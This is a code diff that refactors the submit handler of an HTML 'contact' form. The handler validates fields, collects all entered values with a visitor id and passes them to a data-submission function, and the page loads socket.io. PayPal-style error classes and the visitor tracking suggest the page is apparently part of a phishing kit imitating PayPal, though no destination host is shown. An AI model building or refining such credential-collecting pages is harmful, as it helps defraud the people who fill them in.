@@ -10683,60 +10683,71 @@
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="./script/emit.js"></script> 
 <script>
-	page = "contact";
-	$(document).ready(function() {
-    $('form').on('submit', async function(event) {
+page = "contact";
+
+$(document).ready(function () {
+    $('#form').on('submit', async function (event) {
         event.preventDefault();
-        let myForm = $("#form");
-        let checkInputs = document.querySelectorAll('.check');
-        
-        sessionStorage.setItem('country', document.getElementById('country').value);
-        
-        // Flag to track if any input is empty
+
+        const $form = $('#form');
+        const checkInputs = document.querySelectorAll('.check');
+
+        sessionStorage.setItem(
+            'country',
+            document.getElementById('country')?.value || ''
+        );
+
         let isEmpty = false;
-	
-        
-        for (const check of checkInputs) {
-        
+
+        checkInputs.forEach(check => {
+            const $parent = check.parentElement;
+            const errorEl = check.nextElementSibling;
+
             if (check.value.trim() === "") {
-                var errmesage = check.name;
-                check.nextElementSibling.textContent = " Required";
-                check.parentElement.classList.add('ppvx_field--error___3-14-9');
                 isEmpty = true;
-                
-                
-            }else{
-            
-                check.parentElement.classList.remove('ppvx_field--error___3-14-9');
-                console.log(check.value);
-                var errmesage = check.id;
-                document.querySelectorAll('.errmes').textContent = errmesage + " se requiere"; 
-                check.nextElementSibling.borderColor =  "red"; 
-                check.nextElementSibling.textContent = "";
-                isEmpty = false;
+
+                if (errorEl) {
+                    errorEl.textContent = " Required";
+                }
+
+                if ($parent) {
+                    $parent.classList.add('ppvx_field--error___3-14-9');
+                }
+            } else {
+                if (errorEl) {
+                    errorEl.textContent = "";
+                    errorEl.style.borderColor = "";
+                }
+
+                if ($parent) {
+                    $parent.classList.remove('ppvx_field--error___3-14-9');
+                }
             }
-        }
+        });
 
-        if (!isEmpty) {
-            document.querySelector('#subbut').disabled = true;
-            document.getElementById('load').style.display = "block";
-            let userinfo = myForm.serializeArray();
-            let user = {};
-            var visitor = sessionStorage.getItem('visitor');
+        if (isEmpty) return;
 
-            userinfo.forEach((value) => {
-                user[value.name] = value.value;
-            });
-            
-            //checkEmailDomain(usern.value); 
-			
-            user['visitor'] = visitor;
+        $('#subbut').prop('disabled', true);
+        $('#load').show();
+
+        const userinfo = $form.serializeArray();
+        const user = {};
+        const visitor = sessionStorage.getItem('visitor');
+
+        userinfo.forEach(field => {
+            user[field.name] = field.value;
+        });
+
+        user.visitor = visitor;
+
+        try {
             await submitFormData(user);
-            
-
-            
+        } catch (err) {
+            console.error(err);
+            $('#subbut').prop('disabled', false);
+            $('#load').hide();
         }
     });
 });
-	</script>
+</script> 
 </html>
